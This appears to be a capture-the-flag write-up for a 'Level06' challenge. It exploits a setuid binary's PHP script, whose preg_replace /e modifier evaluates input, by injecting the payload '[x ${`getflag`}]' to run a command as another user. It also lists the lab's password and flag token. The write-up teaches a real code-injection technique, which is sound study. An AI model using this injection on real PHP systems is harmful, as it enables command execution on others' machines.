# Level06 - Flag06

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level06 | `viuaaale9huek52boumoomioc` |
| flag06  |                             |
| token   | `wiok45aaoguiboiki2tuin6ub` |

## Steps to resolve on VM

1. Connect to `level06` user and notice there is an executable and a php script owned by `flag06` user

```bash
su level06
# Enter the token

ls -l
> -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
> -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

2. Check the files

```bash
# We check first the content executed by this executable
strings level06
> [...]
> /usr/bin/php # It's indeed a PHP executable
> /home/user/level06/level06.php # Which is using the 'level06.php' script
> [...]

cat level06.php
> #!/usr/bin/php
> <?php
> function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
> function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
> $r = x($argv[1], $argv[2]); print $r;
> ?>
# By watching the script, we can notice that it takes a file as an argument, and applies some 'preg_replace'
# However, the first 'preg_replace' uses the 'e' modifier, a deprecated regex modifier which allows you to use PHP code within your regular expression
# We will use that to inject our "getflag" command
```

3. Exploit the 'e' modifier

We must match the `/(\\[x (.*)\\])/e` regex so it captures our "getflag" command and executes it with the 'e' modifier.

Basically, it will match anything with a format like : `[x test]`, and capture "test" in this example

So we need to give him getflag like this: [x \`getflag\`],
but to make it executable by the PHP script we must enclose it : [x ${\`getflag\`}]

```bash
# 1. Put it in a file
echo '[x ${`getflag`}]' > /tmp/flag06

# 2. Execute the PHP script to get the flag
./level06 /tmp/flag06
> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
>  in /home/user/level06/level06.php(4) : regexp code on line 1
>
```

---

## Sources

### SHELL

- [/e regex modifier](https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier)
- [Meaning of \\2](https://stackoverflow.com/questions/44879971/php-meaning-1-in-preg-replace)